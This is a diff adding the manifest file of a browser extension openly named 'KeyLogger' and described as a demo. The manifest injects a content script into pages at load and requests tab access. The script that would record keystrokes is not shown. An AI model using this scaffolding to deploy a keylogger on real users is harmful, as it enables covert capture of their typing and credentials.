@@ -1,0 +1,22 @@
+{
+  "manifest_version": 2,
+  "name": "KeyLogger",
+  "version": "0.1",
+  "author": "Buzz2d0",
+  "description": "KeyLogger Demo",
+
+  "icons": {
+    "16": "logo.png",
+    "48": "logo.png",
+    "128": "logo.png"
+  },
+  "content_scripts": [
+    {
+      "matches": ["http://*/"],
+      "js": ["content-script.js"],
+      "run_at": "document_start"
+    }
+  ],
+  "permissions": ["tabs"],
+  "homepage_url": "https://github.com/Buzz2d0/"
+}
